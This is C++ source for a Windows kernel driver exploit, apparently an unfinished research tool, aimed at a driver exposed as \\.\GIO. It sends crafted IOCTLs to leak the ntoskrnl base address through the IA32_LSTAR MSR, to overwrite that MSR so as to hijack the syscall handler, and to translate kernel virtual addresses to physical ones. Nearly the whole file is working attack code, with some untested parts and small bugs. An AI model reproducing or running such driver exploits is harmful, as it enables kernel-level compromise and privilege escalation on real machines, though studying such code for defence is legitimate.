
// gdrv_exploit.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>

#define IOCTL_MmGetPhysicalAddress 0xC350280C

/*

For using MmMapIoSpace(), we need to obtain a "Phyiscal Address" as the first argument.
TODO:
    - Research the differences between IOCTL_MmMapIoSpace & IOCTL_MmMapIoSpace2 (The IOCTL number
      isn't 100% clear, but it seems to be 0xC3502840, further research is required).
    
    - IOCTL_MmMapIoSpace seems to be an "Arbitrary Read" vulnerability

*/

#define IOCTL_MmMapIoSpace         0xC3502000
#define IOCTL_MmMapIoSpace2        0xC3502840

// For readmsr():
// IOCTL IOCTL 0xC3502580
// InputBufferLength == OutputBufferLength && InputBufferLength == 16
// can be used to leak the IA32_LSTAR MSR address 
#define IOCTL_readmsr_caller       0xC3502580   

// For writemsr():
// IOCTL 0xC3502580
// *(DWORD*)PSystemBuffer == 1
// can be used to write the IA32_LSTAR MSR and overwrite KiSystemCall64() address
#define IOCTL_writemsr_caller      0xC3502580   

#define IOCTL_ZwUnmapViewOfSection 0xC3502008


ULONG_PTR ReadMSR(DWORD MSRIndex)
{
    printf("[+] in ReadMSR...\nPress Enter to continue...");
    getchar();
    //Name of the device might be different!!
    HANDLE hDevice = CreateFile(L"\\\\.\\GIO", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
    if (hDevice == INVALID_HANDLE_VALUE)
    {
        printf("[-] Handle to the device couldn't be created: %u\n", GetLastError());
        return -1;
    }
    printf("[+] Handle to device \\\\.\\GIO was opened successfully!!\n");

    DWORD* InputBuffer = (DWORD*)calloc(1, 0x10);
    DWORD* OutputBuffer = (DWORD*)calloc(1, 0x10);

    InputBuffer[0] = 1; // 1 is the value that invokes the ReadMSR() function in the driver
    InputBuffer[1] = MSRIndex;

    DWORD BytesReturned = 0;
    if (DeviceIoControl(hDevice, IOCTL_readmsr_caller, InputBuffer, 0x10, OutputBuffer, 0x10, &BytesReturned, nullptr)) 
    {
        printf("[+] ReadMSR() DeviceIoControl (0x%x) executed successfully!\n", IOCTL_readmsr_caller);

        DWORD HighDWORD = OutputBuffer[3];
        DWORD LowDWORD = OutputBuffer[2];

        UINT64 KiSystemCall64Address = ((UINT64)HighDWORD << 32) | (UINT64)LowDWORD;
        printf("[+] Leaked nt!KiSystemCall64 address: 0x%p\n", KiSystemCall64Address);

        // --- Clearing and returning---
        free(InputBuffer);
        free(OutputBuffer);

        CloseHandle(hDevice);
        return KiSystemCall64Address;
    }

    printf("[-] Unable to call IOCTL 0x%x: GetLastError(): %u\n", GetLastError());

    free(InputBuffer);
    free(OutputBuffer);

    CloseHandle(hDevice);
    return -1;
}

ULONG_PTR LeakNtoskrnlBaseAddress()
{
    DWORD MSRIndex = 0xC0000082;
    ULONG_PTR KiSystemCall64Address = ReadMSR(MSRIndex);
    DWORD IAT_Offset = 0x40C600; // This might be different between versions of Windows !!!
    
    printf("[+] IAT offset of nt!KiSystemCall64: 0x%x\n", IAT_Offset);

    // ntoskrnl.exe base address can be found in IDA under: Edit -> Segments -> Rebase Program...
    ULONG_PTR BaseAddress = KiSystemCall64Address - IAT_Offset;
    printf("[+] Leaked ntoskrnl.exe base address: 0x%p\n", BaseAddress);

    return BaseAddress;
}


// Haven't tested it yet!!
VOID WriteMSR(DWORD MSRIndex, ULONG_PTR Overwrite)
{
    printf("[+] in WriteMSR...\nPress Enter to continue...");
    getchar();

    //Name of the device might be different!!
    HANDLE hDevice = CreateFile(L"\\\\.\\GIO", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
    if (hDevice == INVALID_HANDLE_VALUE)
    {
        printf("[-] Handle to the device couldn't be created: %u\n", GetLastError());
        return;
    }

    printf("[+] Handle to device \\\\.\\GIO was opened successfully!!\n");

    DWORD* InputBuffer = (DWORD*)calloc(1, 0x10);
    DWORD* OutputBuffer = (DWORD*)calloc(1, 0x10);

    DWORD LowDWORD = (DWORD)(Overwrite & 0xFFFFFFFF);           // obtain lower DWORD of Overwrite variable
    DWORD HighDWORD = (DWORD)((Overwrite >> 32) & 0xFFFFFFFF);  // obtain higher DWORD of Overwrite variable

    InputBuffer[0] = 0;         // 0 is the value that invokes the ReadMSR() function in the driver
    InputBuffer[1] = MSRIndex;  // The MSR register index that we want to overwrite
    InputBuffer[2] = LowDWORD;  // Lower 32-bit value that the MSR will be overwritten with
    InputBuffer[3] = HighDWORD; // Higher 32-bit value that the MSR will be overwritten with

    DWORD BytesReturned = 0;
    if (DeviceIoControl(hDevice, IOCTL_writemsr_caller, InputBuffer, 0x10, OutputBuffer, 0x10, &BytesReturned, nullptr))
    {
        DebugBreak();
        printf("[+] WriteMSR() DeviceIoControl (0x%x) executed successfully!\n", IOCTL_writemsr_caller);
    }
    free(InputBuffer);
    free(OutputBuffer);

    CloseHandle(hDevice);

}

DWORD GetPhysicalAddress(ULONG_PTR VirtualAddress)
{
    printf("[+] in GetPhysicalAddress()...\nPress Enter to continue...");
    getchar();

    //Name of the device might be different!!
    HANDLE hDevice = CreateFile(L"\\\\.\\GIO", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
    if (hDevice == INVALID_HANDLE_VALUE)
    {
        printf("[-] Handle to the device couldn't be created: %u\n", GetLastError());
        return -1;
    }

    printf("[+] Handle to device \\\\.\\GIO was opened successfully!!\n");

    ULONG_PTR* InputBuffer = (ULONG_PTR*)calloc(1, 8);      // 8 bytes virtual address to be translated
    DWORD* OutputBuffer = (DWORD*)calloc(1, 4);

    //RtlCopyMemory(InputBuffer, &VirtualAddress, )
    DWORD BytesReturned = 0;
    if (DeviceIoControl(hDevice, IOCTL_MmGetPhysicalAddress, &VirtualAddress, 8, OutputBuffer, 4, &BytesReturned, nullptr))
    {
        printf("[+] GetPhysicalAddress() DeviceIoControl (0x%x) executed successfully!\n", IOCTL_MmGetPhysicalAddress);
        printf("[+] Physical Address returned for 0x%p is: 0x%x\n", VirtualAddress, *OutputBuffer);

        free(InputBuffer);
        free(OutputBuffer);

        CloseHandle(hDevice);
        return *(DWORD*)OutputBuffer;
    }

    printf("[-] Unabled to execute IOCTL_MmGetPhysicalAddress, GetLastError(): %u\n", GetLastError());
    free(InputBuffer);
    free(OutputBuffer);

    CloseHandle(hDevice);
    return -1;

}




int main()
{
    printf("[*] Starting execution...\n");
    
    ULONG_PTR BaseAddress = LeakNtoskrnlBaseAddress();
    //WriteMSR(0xC0000082, 0xfffff78000000000); // Overwriting IA32_LSTAR MSR with KUSER_SHARED_DATA base address
    
    DWORD KUSER_VirtualAddress = GetPhysicalAddress(0xfffff78000000000);
    printf("[+] Press Enter to finish execution...\n");
    getchar();

    return 0;
}

